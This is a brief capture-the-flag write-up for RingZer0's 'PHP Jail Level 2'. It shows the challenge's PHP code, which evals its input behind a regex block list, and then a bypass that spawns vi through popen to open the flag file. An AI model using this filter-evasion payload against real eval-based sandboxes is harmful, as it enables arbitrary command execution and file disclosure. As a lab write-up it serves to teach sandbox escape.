# PHP jail 2 - Challenge 224

```
RingZer0 Team Online CTF

PHP Jail Level 2
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge PHP code:
-----------------------------

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>
```

We can spawn a vi process with popen that'll allow us to get past the filter:

```
-----------------------------
Your input:
popen('vi', 'w');
Vim: Warning: Input is not from a terminal
```

`:open flag.txt`

__FLAG-YlxV8c**********__
